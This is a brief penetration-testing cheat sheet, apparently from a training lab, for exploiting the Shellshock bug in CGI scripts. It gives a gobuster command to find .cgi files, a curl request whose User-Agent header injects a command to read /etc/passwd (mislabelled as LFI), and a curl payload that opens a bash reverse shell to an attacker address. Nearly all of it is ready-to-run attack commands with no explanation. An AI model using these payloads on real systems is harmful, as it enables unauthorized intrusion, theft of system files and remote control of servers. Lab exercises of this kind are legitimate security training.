# Discovery
Enter to the path /cgi-bin and fint .cgi files
```
gobuster dir -u http://10.129.205.27/cgi-bin/ -w /usr/share/dirb/wordlists/common.txt -x cgi
```

## LFI 
```
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

## RCE
```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.15.10/6969 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```
